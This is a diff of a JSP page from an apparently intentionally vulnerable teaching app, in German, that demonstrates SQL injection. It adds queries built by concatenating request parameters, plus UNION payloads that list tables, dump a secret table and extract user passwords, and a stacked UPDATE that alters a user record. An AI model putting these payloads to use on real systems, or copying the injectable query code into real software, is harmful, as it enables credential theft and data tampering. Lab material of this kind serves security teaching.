@@ -4,9 +4,9 @@
 <%@include file="../header.jsp" %>
 
 <div class="jumbotron">
-    <h1>Einfaches SQL Injection Beispiel</h1>
+    <h1>Einfache SQL Injection Beispiele</h1>
 
-    Ausgabe eines Query Parameters ohne escaping mit jsp. Bitte nicht mit Chrome benutzen der Fängt den XSS Versuch.
+    Wenn Eingaben die vom Benutzer gemacht werden könne,nicht richtig gehandelt werden.
 </div>
 
 <%
@@ -38,13 +38,14 @@
     </thead>
     <tbody>
     <%
-        final ResultSet resultSet = DatabaseHandler.get().executeQuery("SELECT * FROM PUBLIC.USERS ORDER BY " + orderBy + " " + orderHow);
-        while (resultSet.next()) {
+        final ResultSet usersResults = DatabaseHandler.get().executeQuery("SELECT * FROM PUBLIC.USERS ORDER BY " + orderBy + " " + orderHow);
+        while (usersResults.next()) {
     %>
     <tr>
-        <td><%=resultSet.getString(1) %>
+        <td><a href="?userID=<%=usersResults.getString(1)%>"><%=usersResults.getString(1)%>
+        </a>
         </td>
-        <td><%=resultSet.getString(2) %>
+        <td><%=usersResults.getString(2) %>
         </td>
     </tr>
     <%
@@ -53,26 +54,88 @@
     </tbody>
 </table>
 
-<pre>
-  <code>
-      &lt;label&gt;Parameter test: &lt;/label&gt; &#36;{param.test}
-  </code>
-</pre>
+<hr/>
+<%
+    String userId = request.getParameter("userID");
+    if (userId == null) {
+        userId = "1";
+    }
+    final ResultSet userResult = DatabaseHandler.get().executeQuery("SELECT * FROM  PUBLIC.USERS WHERE pk=" + userId);
+    userResult.next();
+%>
 
-<div class="alert alert-info"><strong>Query:</strong>simpleXss.jsp?test=hier ist XSS moeglich&lt;script&gt;alert('Evil XSS');&lt;/script&gt;</div>
+Benutzer mit der id: <%=userId%>
+<ul>
+    <li><strong>Id:</strong><%=userResult.getString(1)%>
+    </li>
+    <li><strong>Name:</strong><%=userResult.getString(2)%>
+    </li>
+</ul>
 
-<hr>
+<hr/>
 
-<h4>Ausgabe ist dann:</h4>
+<a href="https://www.w3schools.com/sql/sql_union.asp" target="_blank">https://www.w3schools.com/sql/sql_union.asp</a>
+<a href="http://breakthesecurity.cysecurity.org/2010/12/hacking-website-using-sql-injection-step-by-step-guide.html" target="_blank">http://breakthesecurity.cysecurity.org/2010/12/hacking-website-using-sql-injection-step-by-step-guide.html</a>
+
+<hr/>
+
+<h4>Finde andere Tabellen:</h4>
 
 <div class="well">
-    <div class="alert alert-error">
-        <label>Parameter test: </label>${param.test}
-    </div>
-    <a class="btn btn-danger" href="simpleXss.jsp?test=hier ist XSS moeglich<script>alert('Evil XSS');</script>">XSS</a>
+    <p>Auf den Button drücken um alle Tabellen zu sehen.</p>
+
+    <div class="alert alert-info"><strong>Query:</strong>?userID=-1 and 1=3 UNION select 1,group_concat(TABLE_NAME),3 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = SCHEMA()</div>
+    <a class="btn btn-danger" href="?userID=-1 and 1=3 UNION select 1,group_concat(TABLE_NAME),3 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = SCHEMA()">Tabellen in der DB</a>
+
+    <div class="alert alert-info"><strong>Query:</strong>?userID=-1 and 1=3 UNION select 1,group_concat(column_name),3 from information_schema.columns where table_name='UBER_SECRET_TABLE'</div>
+    <a class="btn btn-danger" href="?userID=-1 and 1=3 UNION select 1,group_concat(column_name),3 from information_schema.columns where table_name='UBER_SECRET_TABLE'">Spalten in der Tabelle: 'UBER_SECRET_TABLE'</a>
+
+    <div class="alert alert-info"><strong>Query:</strong>?userID=-1 and 1=3 UNION SELECT 1,group_concat(data1||'-'||data2||'<br/>'),3 FROM UBER_SECRET_TABLE</div>
+    <a class="btn btn-danger" href="?userID=-1 and 1=3 UNION SELECT 1,group_concat(data1||'-'||data2||'<br />'),3 FROM UBER_SECRET_TABLE">Daten aus der Tabelle 'UBER_SECRET_TABLE'</a>
+
+
 </div>
 
 <hr/>
+
+
+<h4>Bekomme Passwörter der Benutzer:</h4>
+
+<div class="well">
+
+    <p>Auf den Button drücken um die passörter der Benutzer zu sehen.</p>
+
+    <div class="alert alert-info"><strong>Query:</strong>?userID=-1 and 1=3 UNION SELECT 1,group_concat(name||'-'||password||'<br/>'),3 FROM users</div>
+    <a class="btn btn-danger" href="?userID=-1 and 1=3 UNION SELECT 1,group_concat(name||'-'||password||'<br />'),3 FROM users">Passwörter</a>
+</div>
+
+<hr/>
+
+<h4>Ändere Benutzer mit der ID = 3:</h4>
+
+<div class="well">
+
+    <p>Auf den Button 2 mal drücken. Und aus <strong>meppel</strong> wird das Passwort.</p>
+    <p>Man kann die Daten von Benutzern verändern. z.B. Adresse wo die Ware hingeschickt werden soll, email adresse usw.</p>
+
+    <div class="alert alert-info"><strong>Query:</strong>?orderHow=DESC;UPDATE+USERS+SET+name=password+WHERE+PK=3;</div>
+    <a class="btn btn-danger" href="?orderHow=DESC;UPDATE USERS SET name=password WHERE PK=3">Name = Passwort für Benutzer ID = 3</a>
+</div>
+
+<hr/>
+
+<h4>Bekomme einen Stacktrace:</h4>
+
+<div class="well">
+
+    <p>Auf den Button drücken und StackTrace sehen. Der Angreifer kann somit rumprobieren was es für Spalten in der Tabelle gibt.</p>
+
+    <div class="alert alert-info"><strong>Query:</strong>?orderBy=gibtEsGarnicht</div>
+    <a class="btn btn-danger" href="?orderBy=gibtEsGarnicht">StackTrace</a>
+</div>
+
+<hr/>
+
 
 <h3>Lösung:</h3>
 
